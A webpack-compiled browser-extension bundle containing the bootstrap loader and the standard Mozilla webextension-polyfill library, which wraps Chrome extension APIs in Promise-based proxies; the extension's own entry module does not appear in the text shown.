/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = "./assets/ts/background.ts");
/******/ })
/************************************************************************/
/******/ ({

/***/ "../node_modules/webextension-polyfill-ts/lib/index.js":
/*!*************************************************************!*\
  !*** ../node_modules/webextension-polyfill-ts/lib/index.js ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

Object.defineProperty(exports, "__esModule", { value: true });

// if not in a browser, assume we're in a test, return a dummy
if (typeof window === "undefined") exports.browser = {};
else exports.browser = __webpack_require__(/*! webextension-polyfill */ "../node_modules/webextension-polyfill/dist/browser-polyfill.js");


/***/ }),

/***/ "../node_modules/webextension-polyfill/dist/browser-polyfill.js":
/*!**********************************************************************!*\
  !*** ../node_modules/webextension-polyfill/dist/browser-polyfill.js ***!
  \**********************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;(function (global, factory) {
  if (true) {
    !(__WEBPACK_AMD_DEFINE_ARRAY__ = [module], __WEBPACK_AMD_DEFINE_FACTORY__ = (factory),
				__WEBPACK_AMD_DEFINE_RESULT__ = (typeof __WEBPACK_AMD_DEFINE_FACTORY__ === 'function' ?
				(__WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__)) : __WEBPACK_AMD_DEFINE_FACTORY__),
				__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
  } else { var mod; }
})(typeof globalThis !== "undefined" ? globalThis : typeof self !== "undefined" ? self : this, function (module) {
  /* webextension-polyfill - v0.6.0 - Mon Dec 23 2019 12:32:53 */

  /* -*- Mode: indent-tabs-mode: nil; js-indent-level: 2 -*- */

  /* vim: set sts=2 sw=2 et tw=80: */

  /* This Source Code Form is subject to the terms of the Mozilla Public
   * License, v. 2.0. If a copy of the MPL was not distributed with this
   * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
  "use strict";

  if (typeof browser === "undefined" || Object.getPrototypeOf(browser) !== Object.prototype) {
    const CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE = "The message port closed before a response was received.";
    const SEND_RESPONSE_DEPRECATION_WARNING = "Returning a Promise is the preferred way to send a reply from an onMessage/onMessageExternal listener, as the sendResponse will be removed from the specs (See https://developer.mozilla.org/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage)"; // Wrapping the bulk of this polyfill in a one-time-use function is a minor
    // optimization for Firefox. Since Spidermonkey does not fully parse the
    // contents of a function until the first time it's called, and since it will
    // never actually need to be called, this allows the polyfill to be included
    // in Firefox nearly for free.

    const wrapAPIs = extensionAPIs => {
      // NOTE: apiMetadata is associated to the content of the api-metadata.json file
      // at build time by replacing the following "include" with the content of the
      // JSON file.
      const apiMetadata = {
        "alarms": {
          "clear": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "clearAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "get": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "bookmarks": {
          "create": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getChildren": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getRecent": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getSubTree": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTree": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "move": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeTree": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "browserAction": {
          "disable": {
            "minArgs": 0,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "enable": {
            "minArgs": 0,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "getBadgeBackgroundColor": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getBadgeText": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getPopup": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTitle": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "openPopup": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "setBadgeBackgroundColor": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setBadgeText": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setIcon": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "setPopup": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setTitle": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "browsingData": {
          "remove": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "removeCache": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeCookies": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeDownloads": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeFormData": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeHistory": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeLocalStorage": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removePasswords": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removePluginData": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "settings": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "commands": {
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "contextMenus": {
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "cookies": {
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAllCookieStores": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "set": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "devtools": {
          "inspectedWindow": {
            "eval": {
              "minArgs": 1,
              "maxArgs": 2,
              "singleCallbackArg": false
            }
          },
          "panels": {
            "create": {
              "minArgs": 3,
              "maxArgs": 3,
              "singleCallbackArg": true
            }
          }
        },
        "downloads": {
          "cancel": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "download": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "erase": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getFileIcon": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "open": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "pause": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeFile": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "resume": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "show": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "extension": {
          "isAllowedFileSchemeAccess": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "isAllowedIncognitoAccess": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "history": {
          "addUrl": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "deleteAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "deleteRange": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "deleteUrl": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getVisits": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "i18n": {
          "detectLanguage": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAcceptLanguages": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "identity": {
          "launchWebAuthFlow": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "idle": {
          "queryState": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "management": {
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getSelf": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "setEnabled": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "uninstallSelf": {
            "minArgs": 0,
            "maxArgs": 1
          }
        },
        "notifications": {
          "clear": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "create": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getPermissionLevel": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "pageAction": {
          "getPopup": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTitle": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "hide": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setIcon": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "setPopup": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setTitle": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "show": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "permissions": {
          "contains": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "request": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "runtime": {
          "getBackgroundPage": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getPlatformInfo": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "openOptionsPage": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "requestUpdateCheck": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "sendMessage": {
            "minArgs": 1,
            "maxArgs": 3
          },
          "sendNativeMessage": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "setUninstallURL": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "sessions": {
          "getDevices": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getRecentlyClosed": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "restore": {
            "minArgs": 0,
            "maxArgs": 1
          }
        },
        "storage": {
          "local": {
            "clear": {
              "minArgs": 0,
              "maxArgs": 0
            },
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "remove": {
              "minArgs": 1,
              "maxArgs": 1
            },
            "set": {
              "minArgs": 1,
              "maxArgs": 1
            }
          },
          "managed": {
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            }
          },
          "sync": {
            "clear": {
              "minArgs": 0,
              "maxArgs": 0
            },
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "remove": {
              "minArgs": 1,
              "maxArgs": 1
            },
            "set": {
              "minArgs": 1,
              "maxArgs": 1
            }
          }
        },
        "tabs": {
          "captureVisibleTab": {
            "minArgs": 0,
            "maxArgs": 2
          },
          "create": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "detectLanguage": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "discard": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "duplicate": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "executeScript": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getCurrent": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getZoom": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getZoomSettings": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "highlight": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "insertCSS": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "move": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "query": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "reload": {
            "minArgs": 0,
            "maxArgs": 2
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeCSS": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "sendMessage": {
            "minArgs": 2,
            "maxArgs": 3
          },
          "setZoom": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "setZoomSettings": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "update": {
            "minArgs": 1,
            "maxArgs": 2
          }
        },
        "topSites": {
          "get": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "webNavigation": {
          "getAllFrames": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getFrame": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "webRequest": {
          "handlerBehaviorChanged": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "windows": {
          "create": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getCurrent": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getLastFocused": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        }
      };

      if (Object.keys(apiMetadata).length === 0) {
        throw new Error("api-metadata.json has not been included in browser-polyfill");
      }
      /**
       * A WeakMap subclass which creates and stores a value for any key which does
       * not exist when accessed, but behaves exactly as an ordinary WeakMap
       * otherwise.
       *
       * @param {function} createItem
       *        A function which will be called in order to create the value for any
       *        key which does not exist, the first time it is accessed. The
       *        function receives, as its only argument, the key being created.
       */


      class DefaultWeakMap extends WeakMap {
        constructor(createItem, items = undefined) {
          super(items);
          this.createItem = createItem;
        }

        get(key) {
          if (!this.has(key)) {
            this.set(key, this.createItem(key));
          }

          return super.get(key);
        }

      }
      /**
       * Returns true if the given object is an object with a `then` method, and can
       * therefore be assumed to behave as a Promise.
       *
       * @param {*} value The value to test.
       * @returns {boolean} True if the value is thenable.
       */


      const isThenable = value => {
        return value && typeof value === "object" && typeof value.then === "function";
      };
      /**
       * Creates and returns a function which, when called, will resolve or reject
       * the given promise based on how it is called:
       *
       * - If, when called, `chrome.runtime.lastError` contains a non-null object,
       *   the promise is rejected with that value.
       * - If the function is called with exactly one argument, the promise is
       *   resolved to that value.
       * - Otherwise, the promise is resolved to an array containing all of the
       *   function's arguments.
       *
       * @param {object} promise
       *        An object containing the resolution and rejection functions of a
       *        promise.
       * @param {function} promise.resolve
       *        The promise's resolution function.
       * @param {function} promise.rejection
       *        The promise's rejection function.
       * @param {object} metadata
       *        Metadata about the wrapped method which has created the callback.
       * @param {integer} metadata.maxResolvedArgs
       *        The maximum number of arguments which may be passed to the
       *        callback created by the wrapped async function.
       *
       * @returns {function}
       *        The generated callback function.
       */


      const makeCallback = (promise, metadata) => {
        return (...callbackArgs) => {
          if (extensionAPIs.runtime.lastError) {
            promise.reject(extensionAPIs.runtime.lastError);
          } else if (metadata.singleCallbackArg || callbackArgs.length <= 1 && metadata.singleCallbackArg !== false) {
            promise.resolve(callbackArgs[0]);
          } else {
            promise.resolve(callbackArgs);
          }
        };
      };

      const pluralizeArguments = numArgs => numArgs == 1 ? "argument" : "arguments";
      /**
       * Creates a wrapper function for a method with the given name and metadata.
       *
       * @param {string} name
       *        The name of the method which is being wrapped.
       * @param {object} metadata
       *        Metadata about the method being wrapped.
       * @param {integer} metadata.minArgs
       *        The minimum number of arguments which must be passed to the
       *        function. If called with fewer than this number of arguments, the
       *        wrapper will raise an exception.
       * @param {integer} metadata.maxArgs
       *        The maximum number of arguments which may be passed to the
       *        function. If called with more than this number of arguments, the
       *        wrapper will raise an exception.
       * @param {integer} metadata.maxResolvedArgs
       *        The maximum number of arguments which may be passed to the
       *        callback created by the wrapped async function.
       *
       * @returns {function(object, ...*)}
       *       The generated wrapper function.
       */


      const wrapAsyncFunction = (name, metadata) => {
        return function asyncFunctionWrapper(target, ...args) {
          if (args.length < metadata.minArgs) {
            throw new Error(`Expected at least ${metadata.minArgs} ${pluralizeArguments(metadata.minArgs)} for ${name}(), got ${args.length}`);
          }

          if (args.length > metadata.maxArgs) {
            throw new Error(`Expected at most ${metadata.maxArgs} ${pluralizeArguments(metadata.maxArgs)} for ${name}(), got ${args.length}`);
          }

          return new Promise((resolve, reject) => {
            if (metadata.fallbackToNoCallback) {
              // This API method has currently no callback on Chrome, but it return a promise on Firefox,
              // and so the polyfill will try to call it with a callback first, and it will fallback
              // to not passing the callback if the first call fails.
              try {
                target[name](...args, makeCallback({
                  resolve,
                  reject
                }, metadata));
              } catch (cbError) {
                console.warn(`${name} API method doesn't seem to support the callback parameter, ` + "falling back to call it without a callback: ", cbError);
                target[name](...args); // Update the API method metadata, so that the next API calls will not try to
                // use the unsupported callback anymore.

                metadata.fallbackToNoCallback = false;
                metadata.noCallback = true;
                resolve();
              }
            } else if (metadata.noCallback) {
              target[name](...args);
              resolve();
            } else {
              target[name](...args, makeCallback({
                resolve,
                reject
              }, metadata));
            }
          });
        };
      };
      /**
       * Wraps an existing method of the target object, so that calls to it are
       * intercepted by the given wrapper function. The wrapper function receives,
       * as its first argument, the original `target` object, followed by each of
       * the arguments passed to the original method.
       *
       * @param {object} target
       *        The original target object that the wrapped method belongs to.
       * @param {function} method
       *        The method being wrapped. This is used as the target of the Proxy
       *        object which is created to wrap the method.
       * @param {function} wrapper
       *        The wrapper function which is called in place of a direct invocation
       *        of the wrapped method.
       *
       * @returns {Proxy<function>}
       *        A Proxy object for the given method, which invokes the given wrapper
       *        method in its place.
       */


      const wrapMethod = (target, method, wrapper) => {
        return new Proxy(method, {
          apply(targetMethod, thisObj, args) {
            return wrapper.call(thisObj, target, ...args);
          }

        });
      };

      let hasOwnProperty = Function.call.bind(Object.prototype.hasOwnProperty);
      /**
       * Wraps an object in a Proxy which intercepts and wraps certain methods
       * based on the given `wrappers` and `metadata` objects.
       *
       * @param {object} target
       *        The target object to wrap.
       *
       * @param {object} [wrappers = {}]
       *        An object tree containing wrapper functions for special cases. Any
       *        function present in this object tree is called in place of the
       *        method in the same location in the `target` object tree. These
       *        wrapper methods are invoked as described in {@see wrapMethod}.
       *
       * @param {object} [metadata = {}]
       *        An object tree containing metadata used to automatically generate
       *        Promise-based wrapper functions for asynchronous. Any function in
       *        the `target` object tree which has a corresponding metadata object
       *        in the same location in the `metadata` tree is replaced with an
       *        automatically-generated wrapper function, as described in
       *        {@see wrapAsyncFunction}
       *
       * @returns {Proxy<object>}
       */

      const wrapObject = (target, wrappers = {}, metadata = {}) => {
        let cache = Object.create(null);
        let handlers = {
          has(proxyTarget, prop) {
            return prop in target || prop in cache;
          },

          get(proxyTarget, prop, receiver) {
            if (prop in cache) {
              return cache[prop];
            }

            if (!(prop in target)) {
              return undefined;
            }

            let value = target[prop];

            if (typeof value === "function") {
              // This is a method on the underlying object. Check if we need to do
              // any wrapping.
              if (typeof wrappers[prop] === "function") {
                // We have a special-case wrapper for this method.
                value = wrapMethod(target, target[prop], wrappers[prop]);
              } else if (hasOwnProperty(metadata, prop)) {
                // This is an async method that we have metadata for. Create a
                // Promise wrapper for it.
                let wrapper = wrapAsyncFunction(prop, metadata[prop]);
                value = wrapMethod(target, target[prop], wrapper);
              } else {
                // This is a method that we don't know or care about. Return the
                // original method, bound to the underlying object.
                value = value.bind(target);
              }
            } else if (typeof value === "object" && value !== null && (hasOwnProperty(wrappers, prop) || hasOwnProperty(metadata, prop))) {
              // This is an object that we need to do some wrapping for the children
              // of. Create a sub-object wrapper for it with the appropriate child
              // metadata.
              value = wrapObject(value, wrappers[prop], metadata[prop]);
            } else if (hasOwnProperty(metadata, "*")) {
              // Wrap all properties in * namespace.
              value = wrapObject(value, wrappers[prop], metadata["*"]);
            } else {
              // We don't need to do any wrapping for this property,
              // so just forward all access to the underlying object.
              Object.defineProperty(cache, prop, {
                configurable: true,
                enumerable: true,

                get() {
                  return target[prop];
                },

                set(value) {
                  target[prop] = value;
                }

              });
              return value;
            }

            cache[prop] = value;
            return value;
          },

          set(proxyTarget, prop, value, receiver) {
            if (prop in cache) {
              cache[prop] = value;
            } else {
              target[prop] = value;
            }

            return true;
          },

          defineProperty(proxyTarget, prop, desc) {
            return Reflect.defineProperty(cache, prop, desc);
          },

          deleteProperty(proxyTarget, prop) {
            return Reflect.deleteProperty(cache, prop);
          }

        }; // Per contract of the Proxy API, the "get" proxy handler must return the
        // original value of the target if that value is declared read-only and
        // non-configurable. For this reason, we create an object with the
        // prototype set to `target` instead of using `target` directly.
        // Otherwise we cannot return a custom object for APIs that
        // are declared read-only and non-configurable, such as `chrome.devtools`.
        //
        // The proxy handlers themselves will still use the original `target`
        // instead of the `proxyTarget`, so that the methods and properties are
        // dereferenced via the original targets.

        let proxyTarget = Object.create(target);
        return new Proxy(proxyTarget, handlers);
      };
      /**
       * Creates a set of wrapper functions for an event object, which handles
       * wrapping of listener functions that those messages are passed.
       *
       * A single wrapper is created for each listener function, and stored in a
       * map. Subsequent calls to `addListener`, `hasListener`, or `removeListener`
       * retrieve the original wrapper, so that  attempts to remove a
       * previously-added listener work as expected.
       *
       * @param {DefaultWeakMap<function, function>} wrapperMap
       *        A DefaultWeakMap object which will create the appropriate wrapper
       *        for a given listener function when one does not exist, and retrieve
       *        an existing one when it does.
       *
       * @returns {object}
       */


      const wrapEvent = wrapperMap => ({
        addListener(target, listener, ...args) {
          target.addListener(wrapperMap.get(listener), ...args);
        },

        hasListener(target, listener) {
          return target.hasListener(wrapperMap.get(listener));
        },

        removeListener(target, listener) {
          target.removeListener(wrapperMap.get(listener));
        }

      }); // Keep track if the deprecation warning has been logged at least once.


      let loggedSendResponseDeprecationWarning = false;
      const onMessageWrappers = new DefaultWeakMap(listener => {
        if (typeof listener !== "function") {
          return listener;
        }
        /**
         * Wraps a message listener function so that it may send responses based on
         * its return value, rather than by returning a sentinel value and calling a
         * callback. If the listener function returns a Promise, the response is
         * sent when the promise either resolves or rejects.
         *
         * @param {*} message
         *        The message sent by the other end of the channel.
         * @param {object} sender
         *        Details about the sender of the message.
         * @param {function(*)} sendResponse
         *        A callback which, when called with an arbitrary argument, sends
         *        that value as a response.
         * @returns {boolean}
         *        True if the wrapped listener returned a Promise, which will later
         *        yield a response. False otherwise.
         */


        return function onMessage(message, sender, sendResponse) {
          let didCallSendResponse = false;
          let wrappedSendResponse;
          let sendResponsePromise = new Promise(resolve => {
            wrappedSendResponse = function (response) {
              if (!loggedSendResponseDeprecationWarning) {
                console.warn(SEND_RESPONSE_DEPRECATION_WARNING, new Error().stack);
                loggedSendResponseDeprecationWarning = true;
              }

              didCallSendResponse = true;
              resolve(response);
            };
          });
          let result;

          try {
            result = listener(message, sender, wrappedSendResponse);
          } catch (err) {
            result = Promise.reject(err);
          }

          const isResultThenable = result !== true && isThenable(result); // If the listener didn't returned true or a Promise, or called
          // wrappedSendResponse synchronously, we can exit earlier
          // because there will be no response sent from this listener.

          if (result !== true && !isResultThenable && !didCallSendResponse) {
            return false;
          } // A small helper to send the message if the promise resolves
          // and an error if the promise rejects (a wrapped sendMessage has
          // to translate the message into a resolved promise or a rejected
          // promise).


          const sendPromisedResult = promise => {
            promise.then(msg => {
              // send the message value.
              sendResponse(msg);
            }, error => {
              // Send a JSON representation of the error if the rejected value
              // is an instance of error, or the object itself otherwise.
              let message;

              if (error && (error instanceof Error || typeof error.message === "string")) {
                message = error.message;
              } else {
                message = "An unexpected error occurred";
              }

              sendResponse({
                __mozWebExtensionPolyfillReject__: true,
                message
              });
            }).catch(err => {
              // Print an error on the console if unable to send the response.
              console.error("Failed to send onMessage rejected reply", err);
            });
          }; // If the listener returned a Promise, send the resolved value as a
          // result, otherwise wait the promise related to the wrappedSendResponse
          // callback to resolve and send it as a response.


          if (isResultThenable) {
            sendPromisedResult(result);
          } else {
            sendPromisedResult(sendResponsePromise);
          } // Let Chrome know that the listener is replying.


          return true;
        };
      });

      const wrappedSendMessageCallback = ({
        reject,
        resolve
      }, reply) => {
        if (extensionAPIs.runtime.lastError) {
          // Detect when none of the listeners replied to the sendMessage call and resolve
          // the promise to undefined as in Firefox.
          // See https://github.com/mozilla/webextension-polyfill/issues/130
          if (extensionAPIs.runtime.lastError.message === CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE) {
            resolve();
          } else {
            reject(extensionAPIs.runtime.lastError);
          }
        } else if (reply && reply.__mozWebExtensionPolyfillReject__) {
          // Convert back the JSON representation of the error into
          // an Error instance.
          reject(new Error(reply.message));
        } else {
          resolve(reply);
        }
      };

      const wrappedSendMessage = (name, metadata, apiNamespaceObj, ...args) => {
        if (args.length < metadata.minArgs) {
          throw new Error(`Expected at least ${metadata.minArgs} ${pluralizeArguments(metadata.minArgs)} for ${name}(), got ${args.length}`);
        }

        if (args.length > metadata.maxArgs) {
          throw new Error(`Expected at most ${metadata.maxArgs} ${pluralizeArguments(metadata.maxArgs)} for ${name}(), got ${args.length}`);
        }

        return new Promise((resolve, reject) => {
          const wrappedCb = wrappedSendMessageCallback.bind(null, {
            resolve,
            reject
          });
          args.push(wrappedCb);
          apiNamespaceObj.sendMessage(...args);
        });
      };

      const staticWrappers = {
        runtime: {
          onMessage: wrapEvent(onMessageWrappers),
          onMessageExternal: wrapEvent(onMessageWrappers),
          sendMessage: wrappedSendMessage.bind(null, "sendMessage", {
            minArgs: 1,
            maxArgs: 3
          })
        },
        tabs: {
          sendMessage: wrappedSendMessage.bind(null, "sendMessage", {
            minArgs: 2,
            maxArgs: 3
          })
        }
      };
      const settingMetadata = {
        clear: {
          minArgs: 1,
          maxArgs: 1
        },
        get: {
          minArgs: 1,
          maxArgs: 1
        },
        set: {
          minArgs: 1,
          maxArgs: 1
        }
      };
      apiMetadata.privacy = {
        network: {
          "*": settingMetadata
        },
        services: {
          "*": settingMetadata
        },
        websites: {
          "*": settingMetadata
        }
      };
      return wrapObject(extensionAPIs, staticWrappers, apiMetadata);
    };

    if (typeof chrome != "object" || !chrome || !chrome.runtime || !chrome.runtime.id) {
      throw new Error("This script should only be loaded in a browser extension.");
    } // The build process adds a UMD wrapper around this file, which makes the
    // `module` variable available.


    module.exports = wrapAPIs(chrome);
  } else {
    module.exports = browser;
  }
});
//# sourceMappingURL=browser-polyfill.js.map


/***/ }),

